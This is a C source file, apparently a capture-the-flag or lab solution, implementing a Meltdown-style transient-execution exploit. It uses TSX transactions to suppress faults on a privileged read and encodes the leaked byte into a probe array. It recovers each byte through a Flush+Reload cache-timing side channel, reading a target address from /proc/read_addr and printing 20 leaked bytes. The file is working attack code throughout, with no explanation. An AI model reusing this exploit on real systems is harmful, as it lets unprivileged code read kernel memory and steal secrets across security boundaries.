#define _GNU_SOURCE

#include <fcntl.h>
#include <immintrin.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define threshold 120
uint8_t probe_arr[256 * 4096];

int probe(char *addr) {
    volatile unsigned long time;
    asm __volatile__(".intel_syntax noprefix;"
                     "mfence;"
                     "lfence;"
                     "rdtsc;"
                     "lfence;"
                     "mov esi, eax;"
                     "mov eax, [%1];"
                     "lfence;"
                     "rdtsc;"
                     "sub eax, esi;"
                     "clflush [%1];"
                     ".att_syntax prefix;"
                     : "=a"(time)
                     : "c"(addr)
                     : "esi", "edx");
    return time < threshold;
}

__attribute__((target("rtm"))) void sread(uintptr_t t) {
    if (_xbegin() == _XBEGIN_STARTED) {
            asm volatile(".intel_syntax noprefix;"
                     "movzx rax, byte ptr [%[addr]];"
                     "shl rax, 12;"
                     "movzx rbx, byte ptr [%[probe] + rax];"
                     ".att_syntax prefix;"
                     :
                     : [addr] "r"(t), [probe] "r"(probe_arr)
                     : "rax", "rbx");
        _xend();
    }
}

void flush() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_arr[i * 4096]);
    }
}

int recov(uintptr_t t) {
    int hits[256] = {0};

    for (int ii = 0; ii < 1000; ii++) {
        flush();
        _mm_mfence();
        // BURN
        for (int it = 0; it < 100; it++) {
            int fd = open("/proc/read_addr", O_RDONLY);
            char buf[64];
            ssize_t n = read(fd, buf, sizeof(buf));
            (void)n;
            close(fd);
        }
        _mm_mfence();
        sread(t);
        for (int i = 1; i < 256; i++) {
            if (probe((char *)&probe_arr[i * 4096])) {
                hits[i]++;
            }
        }
    }
    int best = 1;
    for (int i = 1; i < 256; i++) {
        if (hits[i] > hits[best]) {
            best = i;
        }
    }
    return best;
}

int main(void) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);
    memset(probe_arr, 0xAA, 256 * 4096);
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_arr[i * 4096]);
    }
    _mm_mfence();

    uintptr_t addr = 0;
    FILE *f = fopen("/proc/read_addr", "r");
    if (fscanf(f, "%lx", &addr) != 1) {
        return 0;
    }
    fclose(f);
    char res[21] = {0};
    for (int i = 0; i < 20; i++) {
        res[i] = recov(addr + i);
    }
    printf("%s\n", res);
    fflush(stdout);
}

